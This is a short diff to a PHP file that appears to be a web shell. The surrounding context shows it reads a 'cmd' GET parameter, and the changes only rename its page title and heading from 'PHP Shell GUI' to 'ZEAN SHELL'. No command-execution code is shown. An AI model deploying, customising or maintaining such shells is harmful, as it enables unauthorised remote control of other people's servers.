@@ -90,7 +90,7 @@ if (isset($_GET['cmd'])) {
 <html lang="en">
 <head>
 <meta charset="UTF-8" />
-<title>🌐 PHP Shell GUI with Back & Top Panel</title>
+<title>🌐 ZEAN SHELL</title>
 <style>
     body {
         background: #1e1e2f; color: #cfd2dc; font-family: monospace; margin:0; padding: 20px;
@@ -191,7 +191,7 @@ if (isset($_GET['cmd'])) {
 </script>
 </head>
 <body>
-<h1>🌐 PHP Shell GUI</h1>
+<h1>🌐 ZEAN SHELL</h1>
 
 <div id="back-button">
     <a href="?path=<?= urlencode($initial_path) ?>" style="font-weight:bold; color:#6af;">
